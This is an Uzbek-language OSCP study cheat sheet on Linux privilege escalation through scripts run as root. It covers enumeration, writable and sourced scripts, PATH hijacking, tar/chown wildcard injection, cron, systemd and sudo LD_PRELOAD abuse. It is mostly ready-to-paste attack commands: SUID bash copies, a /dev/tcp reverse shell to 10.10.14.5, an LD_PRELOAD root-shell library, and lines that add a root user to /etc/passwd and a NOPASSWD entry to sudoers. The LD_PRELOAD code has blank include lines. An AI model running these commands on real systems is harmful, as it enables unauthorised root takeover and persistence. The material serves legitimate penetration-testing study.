# root@script-privesc

OSCP · Linux Privilege Escalation

[① Topish](#enum) [② Faylga yozish](#s-direct) [③ Chaqirilgan fayl](#s-called) [④ PATH hijack](#s-path) [⑤ Writable papka](#s-dir) [⑥ Wildcard](#s-wild) [⑦ Cron](#s-cron) [⑧ Systemd](#s-systemd) [⑨ sudo/LD_PRELOAD](#s-ld) [⑩ Payloadlar](#payloads) [Qoidalar](#rules)

Asos: biror narsa **root** nomidan ishga tushadi va siz unga ta'sir qila olasiz. Savol faqat — **qayeridan**? Fayl o'zimi, u chaqirgan narsami, PATH mi, papkami, argumentlarimi. Har bo'lim: **tekshirish → ishlatish**.

## topish Root nomidan nima ishlayotganini aniqlash

Hujumdan oldin: nima root bo'lib ishlaydi va qayer yozilishga ochiq?

### pspy — root jarayonlarini real vaqtda kuzatish

Cron va fon skriptlari `ps` da ko'rinmay qolishi mumkin. `pspy` yangi jarayonlarni root bo'lmay turib ko'rsatadi — OSCP'da eng foydali vosita.

```
./pspy64 -pf -i 1000   # -p komandalar, -f fayl hodisalari, -i ms
```

### Yozilishga ochiq fayl va papkalar

Root ishlatadigan, lekin siz yoza oladigan narsalar — nishon. pspy chiqishidagi yo'llarni shular bilan solishtiring.

```
# biz yoza oladigan fayllar
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'
# biz yoza oladigan papkalar (fayl almashtirish uchun)
find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys'
# guruhimiz yoza oladiganlar
find / -group $(id -gn) -writable 2>/dev/null
```

### sudo huquqlari va SUID binarlar

Bir vaqtning o'zida tekshiring — ba'zan privesc shu yerda tugaydi.

```
sudo -l                               # parolsiz nima ishlata olamiz
find / -perm -4000 -type f 2>/dev/null   # SUID binarlar → GTFOBins
find / -perm -2000 -type f 2>/dev/null   # SGID
```

### Skriptni o'qib, "qayeridan" ekanini aniqlash

Topilgan root skriptini **albatta o'qing**. Qaysi fayllarni `source` qiladi, qaysi komandalarni to'liq yo'lsiz chaqiradi, qayerda `*` ishlatadi — zaiflik shu yerdan chiqadi.

```
cat /opt/script.sh
# xavfli naqshlarni ajratib olish
grep -nE 'source|^\s*\.|cp |tar |chown |rsync |\*|\$[A-Z]' /opt/script.sh
```

## ssenariy ② Skriptning o'ziga yozish huquqi bor

**QACHON:** `ls -la` da skript sizga (yoki guruhingizga) yozishga ochiq. Eng oddiy holat.

### Tekshirish

```
ls -la /opt/script.sh
echo 'test' >> /opt/script.sh   # yozilsa — ochiq
```

### Ishlatish — SUID bash qo'shish

Faylga satr qo'shasiz; root uni keyingi marta ishlatganda bash'ning SUID nusxasi yaratiladi. Keyin `-p` bilan rootga chiqasiz (sizning holatingizdagidek).

```
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/script.sh
# root ishlatguncha kuting (cron/service), keyin:
/tmp/rootbash -p
id   # euid=0(root)
```

## ssenariy ③ Faylga yo'q, lekin u chaqirgan/source qilgan faylga bor

**QACHON:** Skriptning o'zi himoyalangan, ammo u ichida `source /path/conf.sh`, `. ./env`, yoki boshqa skript/binarni chaqiradi — va **o'sha** narsa yozilishga ochiq. Aynan siz aytgan holat.

### Tekshirish — nimani chaqiradi?

```
grep -nE 'source|^\s*\.\s|/bin/|/opt/|\.sh' /opt/script.sh
# topilgan fayllar bizga ochiqmi?
ls -la /opt/conf.sh /opt/lib/helper.sh
```

### Ishlatish — chaqirilgan faylga yozish

Skript `conf.sh` ni `source` qilsa, uning ichidagi kod **asosiy skript bilan bir xil (root) huquqda** bajariladi.

```
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/conf.sh
# yoki teskari shell:
echo 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' >> /opt/conf.sh
# root ishlatgach:
/tmp/rootbash -p
```

**Eslatma:** `source` (yoki `.`) bilan chaqirilgan fayl o'sha jarayonning huquqida ishlaydi. Agar skript faylni oddiy `./helper.sh` deb bajarsa va u bajariladigan bo'lsa — baribir root huquqida ketadi.

## ssenariy ④ PATH hijacking — to'liq yo'lsiz chaqiruv

**QACHON:** Root skripti komandani **to'liq yo'lsiz** chaqiradi (masalan shunchaki `tar`, `service`, `backup`) va siz PATH ichidagi papkaga yoza olasiz yoki root'ning PATH'iga ta'sir qila olasiz.

### Tekshirish

Skriptda `/usr/bin/tar` emas, shunchaki `tar` ko'rinsa — nomzod. Shuningdek yozilishga ochiq PATH papkasini qidiring.

```
grep -nE '^\s*[a-z]' /opt/script.sh   # to'liq yo'lsiz komandalar
echo $PATH
find / -writable -type d 2>/dev/null | grep -E 'bin|/usr/local'
```

### Ishlatish — soxta binar yaratish

Skript chaqirgan komanda nomi bilan o'zingizning fayl yarating va uni PATH'da avvalroqqa qo'ying.

```
# skript "backup" ni yo'lsiz chaqiradi deylik
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/backup
chmod +x /tmp/backup
export PATH=/tmp:$PATH   # agar root jarayoni bizning PATH'ni meros olsa
# cron bo'lsa: cron'ning yozilishi mumkin PATH papkasiga joylang
/tmp/rootbash -p
```

## ssenariy ⑤ Faylga yo'q, lekin papkasiga yozish huquqi bor

**QACHON:** Skriptning o'ziga yoza olmaysiz, ammo u **turgan papka** yozilishga ochiq. Linux'da papka yozish huquqi = fayllarni o'chirish/almashtirish huquqi.

### Tekshirish

```
ls -ld /opt            # papkada 'w' bizda bormi?
ls -la /opt/script.sh  # faylning o'zi himoyalangan bo'lsa ham mayli
```

### Ishlatish — faylni butunlay almashtirish

Eski faylni o'chirib (yoki chetga surib), o'rniga o'zingizniki qo'yasiz. Egalik/ruxsatlar ahamiyatsiz — yangi fayl sizniki, lekin uni root ishga tushiradi.

```
mv /opt/script.sh /opt/script.sh.bak
cat > /opt/script.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
chmod +x /opt/script.sh
# root ishlatgach:
/tmp/rootbash -p
```

## ssenariy ⑥ Wildcard injection (tar / chown / rsync / zip)

**QACHON:** Root skripti yozilishga ochiq papkada `*` ishlatadi — masalan `tar czf backup.tgz *`. Fayl nomlarini argument sifatida "o'tkazib" yuborasiz.

### Tekshirish

```
grep -nE 'tar |chown |chmod |rsync |zip ' /opt/script.sh | grep '\*'
ls -ld /path/to/wildcard/dir   # shu papkaga yoza olamizmi?
```

### tar — checkpoint orqali kod bajarish

Fayl nomlarini `tar` ning bayroqlari deb o'qitasiz. Root `tar ... *` ishlatganda bizning komanda ishlaydi.

```
cd /path/to/wildcard/dir
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > sh.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh sh.sh"
# root tar ishlatgach → /tmp/rootbash -p
```

### chown / chmod — --reference trigi

Root `chown -R root *` ishlatsa, o'zingiz egalik qiladigan faylga ishora berib, boshqa faylni o'zingizga "o'tkazib" olasiz.

```
touch myfile                      # biz egamiz
echo "" > "--reference=myfile"     # chown endi myfile egasiga tenglashtiradi
```

**Maslahat:** `rsync -e`, `zip -T --unzip-command`, `7z` va boshqalar uchun ham shunga o'xshash trik bor — GTFOBins'da "Sudo/Wildcard" bo'limiga qarang.

## ssenariy ⑦ Cron job

**QACHON:** Root cron yozilishga ochiq skript yoki papkaga ishlaydi, yoki cheklangan PATH bilan yo'lsiz komanda chaqiradi. Vaqtni biladiganingiz uchun qulay.

### Tekshirish

```
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
cat /var/spool/cron/crontabs/* 2>/dev/null
grep -rnw '/etc/cron*' -e 'root' 2>/dev/null
```

### Ishlatish

Cron chaqirgan skript yoki u foydalanadigan fayl bizga ochiq bo'lsa — ②–⑤ ssenariylaridagi usullar bilan bir xil. Cron'ning `PATH` qatori odatda `/usr/bin:/bin` — PATH hijack uchun shu papkalardan birini yoki crontab'dagi PATH'ni tekshiring.

```
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/cron-script.sh
# keyingi ishga tushishni kuting (pspy bilan vaqtni ko'ring), so'ng:
/tmp/rootbash -p
```

## ssenariy ⑧ Systemd service / timer

**QACHON:** `.service` faylining o'zi yoki uning `ExecStart` ko'rsatgan binari/skripti yozilishga ochiq, yoki siz servisni restart qila olasiz.

### Tekshirish

```
systemctl list-timers --all
find /etc/systemd /lib/systemd /run/systemd -name '*.service' -writable 2>/dev/null
# ExecStart binarlari yozilishga ochiqmi — birma-bir tekshiring
grep -r ExecStart /etc/systemd/system/ 2>/dev/null
```

### Ishlatish — ExecStart'ni o'zgartirish

```
# .service yozilishga ochiq bo'lsa:
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
# so'ng restart (ruxsat bo'lsa) yoki reboot/avto-ishga tushishni kuting:
systemctl daemon-reload && systemctl restart 
/tmp/rootbash -p
```

## ssenariy ⑨ sudo + LD_PRELOAD / LD_LIBRARY_PATH

**QACHON:** `sudo -l` chiqishida `env_keep+=LD_PRELOAD` yoki `LD_LIBRARY_PATH` ko'rinadi — ya'ni sudo bu muhit o'zgaruvchisini saqlab qoladi.

### Ishlatish — LD_PRELOAD kutubxonasi

Yuklanganda root huquqida shell ochadigan kichik `.so` yozib, ruxsat etilgan istalgan sudo komandasi bilan yuklaysiz.

```
cat > /tmp/x.c <<'EOF'
#include 
#include 
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so 
```

## payload ⑩ Payload kutubxonasi

Yuqoridagi istalgan ssenariyga "kerakli kod" o'rniga qo'yiladigan bo'laklar.

### SUID bash — eng ishonchlisi

Barqaror va imtihonda tez. Skriptlarda SUID ishlamaydi — shuning uchun bash **binarining** nusxasi olinadi, keyin `-p` majburiy.

```
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
/tmp/rootbash -p
```

### Teskari shell (reverse shell)

```
bash -i >& /dev/tcp/10.10.14.5/443 0>&1
# tinglovchi (o'z mashinangizda):  nc -lvnp 443
```

### /etc/passwd ga root user qo'shish

`passwd` yozilishga ochiq bo'lsa (nodir, lekin uchraydi). Parol: `hacked`.

```
echo 'hax:$1$xyz$7s2.6Yg3Nn0z5I3vWkFfW0:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax   # parol: hacked   (yoki openssl passwd -1 bilan yangi hash)
```

### sudoers ga o'zini qo'shish

```
echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
sudo -i
```

## muhim Yodda tutiladigan qoidalar

### Nega buyruqlar ba'zan ishlamaydi

• **Skriptlarda SUID e'tiborsiz qoldiriladi** (yadro himoyasi) — shuning uchun doim bash *binarining* nusxasi.\
• **Bash SUID holatda huquqni tashlab yuboradi** — shuning uchun `-p` majburiy, aks holda oddiy user bo'lib qolasiz.\
• `source`/`.` bilan chaqirilgan fayl — o'sha jarayonning huquqida; alohida bajarilgan skript — o'zining shebangi bilan.\
• Cron/systemd PATH odatda qisqa (`/usr/bin:/bin`) — PATH hijack uchun shuni hisobga oling.

### Tekshiruv natijasini tasdiqlash & reportga yozish

```
id          # euid=0(root) ko'rinishi kerak
whoami
hostname    # proof.txt / local.txt uchun kontekst
```

Reportda tasnif: *Privilege Escalation via root-executed writable script → SUID root shell*. Qaysi ssenariy bo'lganini (②–⑨) aniq yozing.

**OPSEC / tozalash:** imtihondan keyin qo'shgan satrlaringizni, `/tmp/rootbash` va wildcard fayllarni olib tashlang — lab mashinalarida tartib muhim, va report'da "cleanup" bandini ko'rsatish yaxshi ball beradi.

Hech narsa topilmadi — boshqa so'z bilan urinib ko'ring.

root-script-privesc · faqat ruxsat etilgan lab / imtihon mashinalari uchun · OSCP study aid\
Yondosh mavzular: GTFOBins · LinPEAS · `find -perm -4000` · pspy